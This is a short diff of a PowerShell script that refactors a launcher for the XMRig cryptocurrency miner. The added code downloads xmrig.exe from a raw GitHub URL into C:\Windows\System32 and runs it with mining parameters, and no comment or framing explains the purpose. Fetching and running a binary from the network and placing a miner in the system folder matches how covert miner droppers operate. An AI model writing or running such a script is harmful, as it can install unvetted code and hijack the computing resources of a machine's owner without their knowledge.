@@ -1,11 +1,6 @@
 $filePath = "C:\Windows\System32\xmrig.exe"
 
-if (-not (Test-Path $filePath)) {
-    $url = "https://raw.githubusercontent.com/BinhPhuongIT/xmrig-customs/main/xmrig.exe"
-    Invoke-WebRequest -Uri $url -OutFile $filePath
-
-    Start-Process -FilePath $filePath
-} else {
+function Run-XMRig {
     Set-Location $PSScriptRoot
     
     $donateLevel = 1
@@ -25,5 +20,13 @@ if (-not (Test-Path $filePath)) {
     $xmrigCommand = "$xmrigPath $($xmrigParams.GetEnumerator() | ForEach-Object { "--$($_.Key) $($_.Value)" })"
     
     Start-Process -FilePath "powershell" -ArgumentList $xmrigCommand -Wait
+}
 
+if (-not (Test-Path $filePath)) {
+    $url = "https://raw.githubusercontent.com/BinhPhuongIT/xmrig-customs/main/xmrig.exe"
+    Invoke-WebRequest -Uri $url -OutFile $filePath
+
+    Run-XMRig
+} else {
+    Run-XMRig
 }
